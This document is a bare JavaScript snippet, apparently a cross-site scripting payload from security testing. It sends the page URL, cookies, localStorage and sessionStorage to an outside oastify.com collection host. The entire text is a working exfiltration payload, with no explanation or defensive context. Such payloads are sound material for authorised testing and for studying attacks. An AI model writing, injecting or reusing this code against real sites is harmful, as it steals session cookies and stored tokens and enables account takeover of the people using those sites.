fetch('https://d4n.nxosgoe939ibpjgfo5woxdb55wbozen3.oastify.com/', {
  method: 'POST',
  body: JSON.stringify({
    url: location.href,
    cookies: document.cookie,
    local: localStorage,
    session: sessionStorage
  })
});
